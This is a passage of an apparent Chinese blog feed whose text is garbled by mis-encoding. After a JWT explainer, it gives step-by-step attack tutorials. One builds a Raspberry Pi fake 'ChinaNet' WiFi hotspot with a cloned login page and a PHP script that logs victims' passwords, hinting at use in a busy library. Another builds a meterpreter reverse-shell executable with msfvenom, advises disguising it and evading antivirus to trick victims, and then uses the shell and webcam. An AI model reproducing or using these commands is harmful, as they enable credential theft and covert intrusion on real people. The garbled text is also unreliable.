å®šä¹‰åœ¨ä»€ä¹ˆæ—¶é—´ä¹‹å‰ï¼Œè¯¥jwtéƒ½æ˜¯ä¸å¯ç”¨çš„. iat: jwtçš„ç­¾å‘æ—¶é—´ jti: jwtçš„å”¯ä¸€èº«ä»½æ ‡è¯†ï¼Œä¸»è¦ç”¨æ¥ä½œä¸ºä¸€æ¬¡æ€§token,ä»Žè€Œå›žé¿é‡æ”¾æ”»å‡»ã€‚ å…¬å…±çš„å£°æ˜Ž ï¼šå…¬å…±çš„å£°æ˜Žå¯ä»¥æ·»åŠ ä»»ä½•çš„ä¿¡æ¯ï¼Œä¸€èˆ¬æ·»åŠ ç”¨æˆ·çš„ç›¸å…³ä¿¡æ¯æˆ–å…¶ä»–ä¸šåŠ¡éœ€è¦çš„å¿…è¦ä¿¡æ¯.ä½†ä¸å»ºè®®æ·»åŠ æ•æ„Ÿä¿¡æ¯ï¼Œå› ä¸ºè¯¥éƒ¨åˆ†åœ¨å®¢æˆ·ç«¯å¯è§£å¯†. ç§æœ‰çš„å£°æ˜Ž ï¼šç§æœ‰å£°æ˜Žæ˜¯æä¾›è€…å’Œæ¶ˆè´¹è€…æ‰€å…±åŒå®šä¹‰çš„å£°æ˜Žï¼Œä¸€èˆ¬ä¸å»ºè®®å­˜æ”¾æ•æ„Ÿä¿¡æ¯ï¼Œå› ä¸ºbase64æ˜¯å¯¹ç§°è§£å¯†çš„ï¼Œæ„å‘³ç€è¯¥éƒ¨åˆ†ä¿¡æ¯å¯ä»¥å½’ç±»ä¸ºæ˜Žæ–‡ä¿¡æ¯ã€‚ å®šä¹‰ä¸€ä¸ªpayload:12345&#123; "sub": "1234567890", "name": "lanshiqin", "admin": true&#125; ç„¶åŽå°†å…¶è¿›è¡Œbase64åŠ å¯†ï¼Œå¾—åˆ°Jwtçš„ç¬¬äºŒéƒ¨åˆ†ã€‚1eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImxhbnNoaXFpbiIsImFkbWluIjp0cnVlfQ signaturejwtçš„ç¬¬ä¸‰éƒ¨åˆ†æ˜¯ä¸€ä¸ªç­¾è¯ä¿¡æ¯ï¼Œè¿™ä¸ªç­¾è¯ä¿¡æ¯ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼š header (base64åŽçš„) payload (base64åŽçš„) secretè¿™ä¸ªéƒ¨åˆ†éœ€è¦base64åŠ å¯†åŽçš„headerå’Œbase64åŠ å¯†åŽçš„payloadä½¿ç”¨.è¿žæŽ¥ç»„æˆçš„å­—ç¬¦ä¸²ï¼Œç„¶åŽé€šè¿‡headerä¸­å£°æ˜Žçš„åŠ å¯†æ–¹å¼è¿›è¡ŒåŠ ç›secretç»„åˆåŠ å¯†ï¼Œç„¶åŽå°±æž„æˆäº†jwtçš„ç¬¬ä¸‰éƒ¨åˆ†ã€‚æœ€ç»ˆçš„JWTï¼š1eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImxhbnNoaXFpbiIsImFkbWluIjp0cnVlfQ.QzO3RdsVgG4MxikyFDXt55jIjnjAPF49vvPL_fUd_KQ æ³¨æ„ï¼šsecretæ˜¯ä¿å­˜åœ¨æœåŠ¡å™¨ç«¯çš„ï¼Œjwtçš„ç­¾å‘ç”Ÿæˆä¹Ÿæ˜¯åœ¨æœåŠ¡å™¨ç«¯çš„ï¼Œsecretå°±æ˜¯ç”¨æ¥è¿›è¡Œjwtçš„ç­¾å‘å’Œjwtçš„éªŒè¯ï¼Œæ‰€ä»¥ï¼Œå®ƒå°±æ˜¯ä½ æœåŠ¡ç«¯çš„ç§é’¥ï¼Œåœ¨ä»»ä½•åœºæ™¯éƒ½ä¸åº”è¯¥æµéœ²å‡ºåŽ»ã€‚ä¸€æ—¦å®¢æˆ·ç«¯å¾—çŸ¥è¿™ä¸ªsecret, é‚£å°±æ„å‘³ç€å®¢æˆ·ç«¯æ˜¯å¯ä»¥è‡ªæˆ‘ç­¾å‘jwtäº†ã€‚ å¦‚ä½•åº”ç”¨ä¸€èˆ¬æ˜¯åœ¨è¯·æ±‚å¤´é‡ŒåŠ å…¥Authorizationï¼Œå¹¶åŠ ä¸ŠBeareræ ‡æ³¨ï¼š123headers: &#123; 'Authorization': 'Bearer ' + token &#125; æœåŠ¡ç«¯ä¼šéªŒè¯tokenï¼Œå¦‚æžœéªŒè¯é€šè¿‡å°±ä¼šè¿”å›žç›¸åº”çš„èµ„æºã€‚æ•´ä¸ªæµç¨‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š æ€»ç»“ ä¼˜ç‚¹ å› ä¸ºjsonçš„é€šç”¨æ€§ï¼Œæ‰€ä»¥JWTæ˜¯å¯ä»¥è¿›è¡Œè·¨è¯­è¨€æ”¯æŒçš„ï¼ŒåƒJAVA,JavaScript,NodeJS,PHPç­‰å¾ˆå¤šè¯­è¨€éƒ½å¯ä»¥ä½¿ç”¨ã€‚ å› ä¸ºæœ‰äº†payloadéƒ¨åˆ†ï¼Œæ‰€ä»¥JWTå¯ä»¥åœ¨è‡ªèº«å­˜å‚¨ä¸€äº›å…¶ä»–ä¸šåŠ¡é€»è¾‘æ‰€å¿…è¦çš„éžæ•æ„Ÿä¿¡æ¯ã€‚ ä¾¿äºŽä¼ è¾“ï¼Œjwtçš„æž„æˆéžå¸¸ç®€å•ï¼Œå­—èŠ‚å ç”¨å¾ˆå°ï¼Œæ‰€ä»¥å®ƒæ˜¯éžå¸¸ä¾¿äºŽä¼ è¾“çš„ã€‚ å®ƒä¸éœ€è¦åœ¨æœåŠ¡ç«¯ä¿å­˜ä¼šè¯ä¿¡æ¯, æ‰€ä»¥å®ƒæ˜“äºŽåº”ç”¨çš„æ‰©å±• å®‰å…¨ç›¸å…³ ä¸åº”è¯¥åœ¨jwtçš„payloadéƒ¨åˆ†å­˜æ”¾æ•æ„Ÿä¿¡æ¯ï¼Œå› ä¸ºè¯¥éƒ¨åˆ†æ˜¯å®¢æˆ·ç«¯å¯è§£å¯†çš„éƒ¨åˆ†ã€‚ ä¿æŠ¤å¥½secretç§é’¥ï¼Œè¯¥ç§é’¥éžå¸¸é‡è¦ã€‚ å¦‚æžœå¯ä»¥ï¼Œè¯·ä½¿ç”¨httpsåè®®]]></content>
      <categories>
        <category>åŽç«¯</category>
      </categories>
      <tags>
        <tag>åŽç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ ‘èŽ“æ´¾æ­å»ºé’“é±¼wifiçƒ­ç‚¹]]></title>
    <url>%2F5c639cc1%2F</url>
    <content type="text"><![CDATA[æˆ‘ä»¬è¿žæŽ¥çš„å…¬å…±wifiå…¶å®žæ˜¯éžå¸¸ä¸å®‰å…¨çš„ç½‘ç»œï¼Œéª‡å®¢å¯ä»¥åˆ©ç”¨wifiè·¯ç”±è®¾å¤‡è¿›è¡Œä¸­é—´äººæ”»å‡»ï¼ŒåŠ«æŒDNSä¼ªé€ é’“é±¼ç½‘ç«™ã€‚æŽ¥ä¸‹æ¥æˆ‘ä¼šåšä¸ªç®€å•çš„å®žéªŒï¼Œä¼ªé€ ä¸­å›½ç”µä¿¡çš„è·¯ç”±ChinaNetå¹¶å‘å°„å‡ºçƒ­ç‚¹wifiç­‰å¾…åˆ«äººè¿žæŽ¥ï¼Œä»Žè€Œè¾¾åˆ°èŽ·å–ç”¨æˆ·çš„æ‰‹æœºè´¦æˆ·å’Œå¯†ç çš„ç›®çš„ã€‚æœ¬è®°å½•ä»…ä¾›ä¸ªäººå­¦ä¹ äº¤æµä½¿ç”¨ï¼Œè¯·å‹¿ç”¨äºŽéžæ³•ç”¨é€”ã€‚ æœ¬æ¬¡ä»…æ­å»ºçƒ­ç‚¹è¿›è¡Œè®¾å¤‡å¼•æµï¼Œä¸åšä¸­é—´äººæ”»å‡»ï¼Œè€Œæ˜¯ç®€å•çš„è·³è½¬åˆ°ä¼ªé€ çš„ChinaNeté¡µé¢ï¼Œç­‰å¾…è¿žæŽ¥çš„è®¾å¤‡è¾“å…¥ç”¨æˆ·åå’Œå¯†ç è¿›è¡Œå­˜å‚¨ã€‚ éœ€è¦å®‰è£…ä¸¤ä¸ªè½¯ä»¶ï¼Œå¹¶ä¸”åšä¸€äº›é…ç½®hostapd(ç”¨äºŽæä¾›æ— çº¿å…±äº«,åˆ›å»ºwifiçƒ­ç‚¹)dnsmasq(ç”¨äºŽé…ç½®DNSå’ŒDHCPçš„å·¥å…·,å¯ä»¥å¯¹æŽ¥å…¥çƒ­ç‚¹çš„è®¾å¤‡è¿›è¡Œæµé‡å¼•å¯¼) 1.å®‰è£… hostapd1apt-get install hostapd 2.ç¼–è¾‘hostapdé…ç½®æ–‡ä»¶1vim /etc/hostapd/hostapd.conf é…ç½®å†…å®¹å¦‚ä¸‹12345678910111213141516#WifiæŽ¥å£åç§°,ä½¿ç”¨æ ‘èŽ“æ´¾å†…ç½®çš„æ— çº¿ç½‘å¡wlan0interface=wlan0#wifiçƒ­ç‚¹ç½‘ç»œåç§°ï¼Œå…¶ä»–è®¾å¤‡æœç´¢åˆ°çš„wifiåç§°ssid=ChinaNet#é¢‘é“è®¾ç½®ä¸º6channel=6#æŽ¥å—æ‰€æœ‰MACåœ°å€macaddr_acl=0#å¿½ç•¥ssidå¹¿æ’­ï¼Œéœ€è¦å®¢æˆ·ç«¯çŸ¥é“ç½‘ç»œåç§°ignore_broadcast_ssid=0#æ ‘èŽ“æ´¾3çš„é©±åŠ¨driver=nl80211#ä½¿ç”¨2.4GHZæ³¢æ®µhw_mode=g#å¼€å¯VMMwmm_enabled=1 3.ç¼–è¾‘hostapdçš„é»˜è®¤å®ˆæŠ¤è¿›ç¨‹é…ç½®æ–‡ä»¶1vim /etc/default/hostapd æ·»åŠ é…ç½®å†…å®¹1DAEMON_CONF=&quot;/etc/hostapd/hostapd.conf&quot; 4.ç¼–è¾‘ç½‘ç»œæŽ¥å£é…ç½®1vim /etc/network/interfaces é…ç½®å†…å®¹å¦‚ä¸‹ï¼š123456allow-hotplug wlan0iface wlan0 inet static address 172.24.1.1 netmask 255.255.255.0 network 172.24.1.0 broadcast 172.24.1.255 5.å®‰è£…dnsmasq1apt-get install dnsmasq 6.ç¼–è¾‘dnsmasqé…ç½®æ–‡ä»¶1vim /etc/dnsmasq.conf é…ç½®å†…å®¹å¦‚ä¸‹ï¼š1234567interface=wlan0listen-address=172.24.1.1bind-interfacesserver=8.8.8.8domain-neededbogus-privdhcp-range=172.24.1.50,172.24.1.150,12h 7.ç¼–è¾‘rc.localæ–‡ä»¶ï¼Œåœ¨exit0 ä¸Šæ–¹æ·»åŠ 1iptables-restore &lt; /etc/iptables.ipv4.nat 8.ä¾æ¬¡æ‰§è¡Œä¸‹åˆ—å‘½ä»¤12345sudo sh -c "echo 1 &gt; /proc/sys/net/ipv4/ip_forward"sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE sudo iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPTsudo sh -c "iptables-save &gt; /etc/iptables.ipv4.nat" 9.å¯åŠ¨hostapdå’Œdnsmasq12sudo service hostapd startsudo service dnsmasq start 10.é‡å¯ç³»ç»Ÿ1reboot 11.ç¼–å†™é’“é±¼ç½‘ç«™ç¨‹åºå°†è‡ªå·±çš„ç”µè„‘å…ˆè¿žæŽ¥åˆ°ä¸­å›½ç”µä¿¡çš„è·¯ç”±å™¨ChinaNetç½‘ç»œä¸Šï¼Œå¹¶ä¸”å°†è®¤è¯ç½‘é¡µä¸‹è½½åˆ°æœ¬åœ°ã€‚ä¿®æ”¹è®¤è¯ç½‘é¡µçš„æäº¤è¡¨å•åœ°å€ï¼Œå¯ä»¥æäº¤ç»™è‡ªå·±çš„è¿œç¨‹æœåŠ¡å™¨ï¼Œä¹Ÿå¯ä»¥æäº¤åˆ°æœ¬åœ°ã€‚è¿™é‡Œæˆ‘ä½¿ç”¨æäº¤æäº¤åˆ°æœ¬åœ°çš„æ–¹å¼ï¼Œå°†è¡¨å•æäº¤ç»™ä¸€ä¸ªphpç¨‹åºæ¥å¤„ç†ã€‚ç™»å½•è®¤è¯é¡µé¢12345678&lt;!--çœç•¥éƒ¨åˆ†ä»£ç --&gt;...&lt;form action="login.php" method="post" onsubmit="return false;" id="formCh"&gt; &lt;input name="userName" id="userName3" type="text" class="input_txt" value=""&gt; &lt;input name="password" id="password3" type="password" autocomplete="off" class="input_txt" value=""&gt; &lt;input type="image" src="./dlu.png" onclick="if(!this.disabled) return checkLogin3();"&gt;&lt;/form&gt;... å¤„ç†ç¨‹åºlogin.php123456789101112&lt;?php$userName = $_POST['userName']; // èŽ·å–ç”¨æˆ·å$password = $_POST['password']; // èŽ·å–å¯†ç // ä»¥è¿½åŠ å†…å®¹çš„æ–¹å¼æ‰“å¼€pass.txtæ–‡ä»¶$myfile = fopen("pass.txt","a");// è¦ä¿å­˜çš„æ•°æ®ï¼šç”¨æˆ·å å¯†ç  å½“å‰æ—¶é—´$info = "userName=$userName passWord=$password \t".date("Y-m-d H:i:s")." \n";// å†™å…¥æ–‡ä»¶fwrite($myfile,$info);// å…³é—­æ–‡ä»¶æµfclose($myfile); ç”±äºŽä¹‹å‰å·²ç»æ­å»ºå¥½äº†LNMPçš„çŽ¯å¢ƒï¼Œè‡ªå·±å°†ç¼–å†™å¥½çš„webç¨‹åºæ”¾åˆ°/var/www/htmlè·¯å¾„ä¸‹å³å¯ã€‚phpç¨‹åºè¦ç»™å¯æ‰§è¡Œæƒé™æ‰èƒ½æ“ä½œç£ç›˜æ–‡ä»¶è¿›è¡Œè¯»å†™ï¼Œä¸ºäº†æ–¹ä¾¿æˆ‘ä»¬ä¹‹é—´å°†æ•´ä¸ªhtmlæ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶éƒ½è®¾ç½®ä¸ºå¯æ‰§è¡Œåˆ‡æ¢åˆ°/var/www/ä¸‹ æ‰§è¡Œ chmod 777 html/* 12.æ‰“å¼€æ‰‹æœºï¼Œå³å¯çœ‹åˆ°æ ‘èŽ“æ´¾å‘å‡ºçš„ChinaNetç½‘ç»œ è¿žæŽ¥ä¸ŠåŽå¯ä»¥çœ‹åˆ°æ ‘èŽ“æ´¾ä¸ºè¿žæŽ¥ä¸Šçƒ­ç‚¹çš„wifiåˆ†é…äº†ipåœ°å€ æ‰“å¼€æµè§ˆå™¨ï¼Œéšä¾¿è¾“å…¥ä¸€ä¸ªurlåœ°å€ï¼Œéƒ½å°†è¢«é‡å®šå‘åˆ°æˆ‘ä»¬çš„é’“é±¼é¡µé¢ ç”¨æˆ·è¾“å…¥ç”¨æˆ·åå’Œå¯†ç åŽç‚¹å‡»æäº¤ï¼Œå°†ä¼šæ‰§è¡ŒæŒ‡å®šçš„phpç¨‹åº æ‰“å¼€ç½‘é¡µæ‰€åœ¨çš„æ–‡ä»¶å¤¹ä¸‹æŸ¥çœ‹pass.txtæ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°ç”¨æˆ·å’Œå¯†ç ä»¥åŠç™»å½•æ—¶é—´ åˆ°æ­¤ç®€å•çš„é’“é±¼wifiå°±åˆ¶ä½œå®Œæˆäº†ã€‚æ ‘èŽ“æ´¾+ç§»åŠ¨ç”µæº+Wi-Fiæ¨¡å—+å¤§é»‘èƒŒåŒ…+ä¸€ä¸ªäººæ¥äººå¾€çš„å›¾ä¹¦é¦†+å°†Wi-Fiåå­—è®¾ç½®ä¸ºChinaNetã€‚ä½ æ‡‚çš„]]></content>
      <categories>
        <category>éšç¬”</category>
      </categories>
      <tags>
        <tag>éšç¬”</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ ‘èŽ“æ´¾-æžå®¢çš„çŽ©å…·]]></title>
    <url>%2Fa7058afb%2F</url>
    <content type="text"><![CDATA[æ ‘èŽ“æ´¾æ˜¯ä¸€å°åªæœ‰ä¿¡ç”¨å¡å¤§å°çš„è®¡ç®—æœºã€‚æ ‘èŽ“æ´¾æ— æ‰€ä¸èƒ½ï¼Œå¯ä»¥ç”¨æ¥å­¦ä¹ ç¼–ç¨‹ï¼Œå¯ä»¥ç”¨æ¥ä½œä¸ºwebæœåŠ¡å™¨ï¼Œå®¶åº­åª’ä½“ä¸­å¿ƒï¼Œæ— äººæœºï¼Œå¤©æ°”é¢„æŠ¥ç«™ç­‰ç­‰â€¦å‰ä¸ä¹…ä¹°äº†RASPBERRY PI 3 MODEL Bï¼Œä¼ è¯´ä¸­çš„æ ‘èŽ“æ´¾3ä»£ã€‚å’Œä¹‹å‰çš„æ ‘èŽ“æ´¾2ä»£æ¯”èµ·æ¥æœ‰äº†æ˜Žæ˜¾çš„æ€§èƒ½æå‡ï¼Œæ ‘èŽ“æ´¾2ä»£å·²ç»è¢«æˆ‘æŠ˜è…¾åäº†ï¼Œå¯¹æ¯”2ä»£å‘çŽ°3ä»£æ ‘èŽ“æ´¾å†…ç½®äº†è“ç‰™å’ŒWIFIï¼Œç®€ç›´æ¿€åŠ¨äººå¿ƒã€‚ æ ‘èŽ“æ´¾3å†…ç½®äº†è“ç‰™å’Œwifiï¼Œå¹¶ä¸”æœ‰æ‘„åƒå¤´å’ŒAVæŽ¥å£ï¼Œ4ä¸ªUSBæŽ¥å£å’Œä¸€ä¸ªç½‘ç»œæŽ¥å£ï¼Œæ˜¾ç¤ºæŽ¥å£å’ŒHDMIã€‚ 1GBçš„RAMåŠ ä¸Š40ä¸ªGPIO,å¯ä»¥éžå¸¸æ–¹ä¾¿çš„æŽ§åˆ¶å¤–è®¾ç¡¬ä»¶ï¼Œç®€ç›´æ— æ‰€ä¸èƒ½ã€‚ åœ¨æ ‘èŽ“æ´¾ç³»ç»Ÿä¸Šrootè´¦å·æ˜¯è¢«é”å®šçš„ï¼Œå¹¶ä¸”ä¸å…è®¸è¿œç¨‹ç™»å½•ã€‚æˆ‘ä»¬éœ€è¦å…ˆä¸ºrootè´¦å·è®¾ç½®å¯†ç ï¼Œé…ç½®å…è®¸è¿œç¨‹ç™»å½•ï¼Œè§£é”rootè´¦æˆ·å³å¯ã€‚ä¸ºrootè´¦æˆ·è®¾ç½®å¯†ç 1sudo passwd root é…ç½®å…è®¸è¿œç¨‹ç™»å½•1sudo nano /etc/ssh/sshd_config ä¿®æ”¹ PermitRootLogin without-password ä¸º PermitRootLogin yes è§£é”rootè´¦æˆ·1sudo passwd --unlock root é‡å¯åŽå³å¯ç”¨rootè´¦æˆ·ç™»å½• æŽ¥ä¸‹æ¥åšä¸€äº›å‡çº§12apt-get updateapt-get upgrade --show-upgraded å®‰è£…vim,æ–¹ä¾¿åŽç»­ä¿®æ”¹æ–‡ä»¶ç”¨çš„ç¼–è¾‘å™¨1apt-get install vim æŽ¥ä¸‹æ¥æ­å»ºLNMPå®‰è£…nginx1apt-get install nginx å®‰è£…php7.01apt-get install php7.0 php7.0-mysql php7.0-fpm php7.0-cli php7.0-curl php7.0-gd php7.0-mcrypt å®‰è£…mysql1apt-get install -y mysql-client mysql-server ä¿®æ”¹nginxé…ç½®ï¼Œè®©nginxæ”¯æŒphp1vim /etc/nginx/sites-enabled/default 12345678910# pass PHP scripts to FastCGI server # location ~ \.php$ &#123; include snippets/fastcgi-php.conf; # With php-fpm (or other unix sockets): fastcgi_pass unix:/var/run/php/php7.0-fpm.sock; # With php-cgi (or other tcp sockets): # fastcgi_pass 127.0.0.1:9000; &#125; 123service php7.0-fpm restartservice nginx restartservice mysqld restart åˆ‡æ¢åˆ°æœåŠ¡å™¨webæ ¹ç›®å½•ï¼Œæ–°å»ºindex.php12cd /var/www/html/vim index.php å†…å®¹å¦‚ä¸‹1&lt;?php phpinfo(); ?&gt; æ‰“å¼€æµè§ˆå™¨è¾“å…¥åœ°å€,è®¿é—®index.php]]></content>
      <categories>
        <category>éšç¬”</category>
      </categories>
      <tags>
        <tag>éšç¬”</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å…¥ä¾µWindowsæ“ä½œç³»ç»Ÿ]]></title>
    <url>%2F11219b9e%2F</url>
    <content type="text"><![CDATA[æˆ‘å°†æ¼”ç¤ºæˆ‘æ˜¯å¦‚ä½•ä½¿ç”¨Kali Linuxç³»ç»Ÿæ¥å…¥ä¾µ Windows7æ“ä½œç³»ç»Ÿã€‚é€šè¿‡æ¸—é€æ‹¿åˆ°shellæ‰§è¡Œcmdå‘½ä»¤ï¼Œå¯ä»¥è½»æ˜“çš„åœ¨ç›®æ ‡ä¸»æœºä¸Šåˆ›å»ºå’Œåˆ é™¤æ–‡ä»¶ï¼Œå¹¶ä¸”æ‰“å¼€å¯¹æ–¹çš„æ‘„åƒæœºè¿›è¡Œå½•åƒæ‹ç…§ã€‚æœ¬æ•™ç¨‹ä»…ä¾›ä¸ªäººå­¦ä¹ äº¤æµä½¿ç”¨ï¼Œè¯·å‹¿ç”¨äºŽéžæ³•ç”¨é€”ã€‚ Windowsæ“ä½œç³»ç»Ÿæ˜¯ç›®å‰ä½¿ç”¨äººæ•°æœ€å¤šçš„æ¡Œé¢çº§æ“ä½œç³»ç»Ÿï¼Œè€Œç›®å‰95%ä»¥ä¸Šçš„æœåŠ¡å™¨æ“ä½œç³»ç»Ÿç”¨çš„æ˜¯Linuxç³»ç»Ÿï¼Œä¸¤å¤§ç³»ç»Ÿéƒ½åœ¨å„è‡ªçš„åº”ç”¨é¢†åŸŸå æ®ç€åŠå£æ±Ÿå±±ã€‚é»‘å®¢ä¸»è¦æ”»å‡»çš„ç›®æ ‡ä¸€èˆ¬å°±æ˜¯é’ˆå¯¹ä¸ªäººç”¨æˆ·çš„Windowsæ”»å‡»å’Œé’ˆå¯¹LinuxæœåŠ¡å™¨çš„æ”»å‡»ã€‚è‹¹æžœçš„MacOSç³»ç»Ÿå±žäºŽUnixç³»ç»Ÿçš„ä¸€ä¸ªåˆ†æ”¯ï¼ŒUnixå•†ä¸šç³»ç»Ÿæ˜¯æ”¶è´¹çš„ï¼Œä¹‹æ‰€ä»¥Macå–çš„è¿™ä¹ˆè´µå¯ä»¥çœ‹åšæœ‰ä¸€éƒ¨åˆ†æ˜¯æ“ä½œç³»ç»Ÿçš„ä»·é’±ã€‚è™½ç„¶è‹¹æžœçš„ç¬”è®°æœ¬ä½¿ç”¨äººæ•°çš„æ¯”ä¾‹æ²¡æœ‰Windowsé‚£ä¹ˆå¤šï¼Œä½†æ˜¯å’Œå¾ˆå¤šç¨‹åºå‘˜å–œæ¬¢ç”¨MacBookProç¼–ç¨‹ä¸€æ ·ï¼Œå¾ˆå¤šé»‘å®¢ä¹Ÿå–œæ¬¢ç”¨è‹¹æžœç¬”è®°æœ¬æ¥æžæ¸—é€æµ‹è¯•ã€‚ç”±äºŽè½»è–„æºå¸¦æ–¹ä¾¿ï¼Œéšæ‹¿éšèµ°æ­£å¸¸åŠžå…¬å¯ä»¥ç»­èˆªä¸€å¤©ï¼Œæ¯å¤©å……ç”µç»´æŒç”šè‡³æœ‰çš„äººä»Žæ¥ä¸å…³æœºï¼Œå› æ­¤ä¹Ÿå—åˆ°å¾ˆå¤šå•†åŠ¡äººå£«çš„é’çã€‚æ¯•ç«Ÿè´¨é‡æ‘†åœ¨è¿™ï¼Œæ‰€ä»¥æˆ‘ä¹Ÿä¹°äº†ä¸€å°MacBookProï¼Œè‡³ä»Šå·²ç»å°†è¿‘2å¹´äº†ï¼Œçºªå¿µä¸€ä¸‹å½“æ—¶åˆšä¹°ä¸ä¹…çš„mac åºŸè¯ä¸å¤šè¯´ï¼ŒæŽ¥ä¸‹æ¥è¦è¿›è¡Œæ¸—é€æ”»å‡»ï¼Œå…ˆè¯´æ˜Žè¿™é‡Œç”¨åˆ°çš„è®¾å¤‡å’Œç³»ç»Ÿï¼ŒMacBookProä¸€å° ï¼ˆå¯ä»¥æ˜¯å…¶ä»–ç”µè„‘ï¼‰ä¸ºäº†æµ‹è¯•æ–¹ä¾¿ï¼Œåœ¨è™šæ‹Ÿæœºä¸­åˆ†åˆ«å®‰è£…äº†ï¼š Kali Linux æ“ä½œç³»ç»Ÿï¼ˆç”¨æ¥åšæ¸—é€ä½¿ç”¨çš„æ”»å‡»ç³»ç»Ÿï¼‰ Windows7 æ“ä½œç³»ç»Ÿ (ç”¨æ¥åšè‚‰é¸¡æµ‹è¯•çš„è¢«æ”»å‡»çš„ç³»ç»Ÿ) 1.æ‰“å¼€Kali Linuxæ“ä½œç³»ç»Ÿï¼Œå¯ä»¥åœ¨ç»ˆç«¯è¾“å…¥ ifconfigæŸ¥çœ‹å½“å‰ç³»ç»Ÿçš„ipåœ°å€ï¼Œè¯¥åœ°å€ç”¨äºŽç›®æ ‡ä¸»æœºçš„æ¸—é€ç¨‹åºåå‘è¿žæŽ¥åˆ°è‡ªå·± 2.ä½¿ç”¨msfvenomåˆ¶ä½œæ¸—é€ç¨‹åºï¼ˆä¸‹åˆ—çš„ipåœ°å€æ˜¯æˆ‘Kali Linuxç³»ç»Ÿå½“å‰çš„ipåœ°å€ï¼Œæ ¹æ®è‡ªå·±çš„å®žé™…æƒ…å†µè®¾ç½®ï¼‰1msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.74 LPORT=6666 -f exe -o hello.exe è¾“å…¥lså‘½ä»¤åˆ—å‡ºå½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬åˆšåˆšç”Ÿæˆå¥½çš„ hello.exe 3.è¿›å…¥msfconsoleè®¾ç½®æœ¬æœºç›‘å¬çš„åœ°å€å’Œç«¯å£ä¾æ¬¡è¾“å…¥ä¸‹åˆ—å‘½ä»¤1234msfconsoleuse exploit/multi/handlerset lhost 192.168.1.74set lport 6666 4.æ‰§è¡Œæ¸—é€ç›‘å¬ï¼Œç­‰å¾…è¢«æ”»å‡»ä¸»æœºä¸Šçº¿1exploit -z -j 5.æŽ¥ä¸‹æ¥æ˜¯è¿ç”¨ç¤¾ä¼šå·¥ç¨‹å­¦ï¼Œå°†æ¸—é€ç¨‹åºhello.exeå‘é€ç»™åˆ«äººå³å¯ï¼ˆéœ€è¦è‡ªå·±åŠ å£³ï¼Œå¹¶ä¸”åšå…æ€ï¼Œåšå„ç§ä¼ªè£…ï¼‰ã€‚æˆ‘ä»¬å¯ä»¥æŠŠhello.exeä¼ªè£…æˆå…¶ä»–æ–‡ä»¶è®©è¢«æ”»å‡»è€…è§¦å‘å³å¯ã€‚ä¸ºäº†æ¼”ç¤ºæ–¹ä¾¿ï¼Œæˆ‘æŠŠhello.exeå¤åˆ¶åˆ°Windows7ç³»ç»Ÿï¼Œå¹¶ä¸”ç›´æŽ¥åŒå‡»ã€‚ 6.å›žåˆ°æˆ‘ä»¬çš„Kali Linuxç³»ç»Ÿï¼Œå¯ä»¥çœ‹åˆ°å·²ç»æœ‰ä¸€å°è®¡ç®—æœºé€šè¿‡æ¸—é€ç¨‹åºå‘æˆ‘ä»¬å‘é€äº†æ•°æ®åŒ…ã€‚è¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥å¼€å§‹é€‰æ‹©å…¥ä¾µè®¾å¤‡äº†ã€‚è¾“å…¥sessionsï¼ŒæŸ¥çœ‹å½“å‰åœ¨çº¿çš„è‚‰é¸¡è¾“å…¥sessions -i 1 -iåŽé¢è·Ÿçš„æ˜¯å½“å‰åœ¨çº¿ä¸»æœºçš„session idå· 7.ä½¿ç”¨shellå‘½ä»¤ï¼Œè¿›å…¥ç›®æ ‡ä¸»æœºçš„ç»ˆç«¯å‘½ä»¤è¡Œï¼Œæ‰§è¡Œæ–‡ä»¶çš„æ–°å¢žï¼Œåˆ é™¤ç­‰æ“ä½œè¾“å…¥shellå‘½ä»¤åŽå°±å¯ä»¥çœ‹åˆ°Windowsä¸Šç†Ÿæ‚‰çš„cmdå‘½ä»¤è¡Œç»ˆç«¯å­—ç¬¦äº†ï¼Œè¿›å…¥åŽæˆ‘ä»¬å°±å¯ä»¥æ‰§è¡Œä»»æ„çš„æ“ä½œäº†ï¼Œä½¿ç”¨diræŸ¥çœ‹æ–‡ä»¶ï¼Œmdåˆ›å»ºæ–‡ä»¶ï¼Œrdåˆ é™¤æ–‡ä»¶ï¼Œå…¶ä»–å„ç§å‘½ä»¤ä¸å†åˆ—å‡ºï¼Œå¯è§èº«ä¸ºä¸€ä¸ªåˆæ ¼çš„é»‘å®¢ï¼Œä¸ä»…ä»…è¦åªä¼šLinuxï¼Œè¿˜éœ€è¦ä¼šWindowsçš„å„ç§æ“ä½œï¼Œæ¯”å¦‚cmdå‘½ä»¤å’Œæ³¨å†Œè¡¨ç­‰ï¼Œå¦åˆ™å…¥ä¾µä¹‹åŽä¸çŸ¥é“è¦åšä»€ä¹ˆå°±æ‡µé€¼äº†ï¼Œæˆ‘å¯¹Windowsçš„è¿™äº›æ“ä½œä»…é™äºŽåŸºæœ¬æ“ä½œã€‚ä»¥åŽè¿˜è¦æ…¢æ…¢æé«˜ã€‚ä½¿ç”¨exit é€€å‡ºshellå‘½ä»¤è¡Œps æŸ¥çœ‹è¿›ç¨‹sysinfo æŸ¥çœ‹ç³»ç»Ÿæž¶æž„å’Œä¿¡æ¯ 8.æ‰“å¼€æ‘„åƒå¤´è¿›è¡Œå½•åƒæ‹ç…§1run webcam -p /var/www #åœ¨/var/wwwç›®å½•ç›‘æŽ§ç›®æ ‡ä¸»æœºçš„æ‘„åƒå¤´ æ‰§è¡Œrun webcamå‘½ä»¤åŽï¼Œæ¸—é€ç¨‹åºä¼šæ‰“å¼€ç›®æ 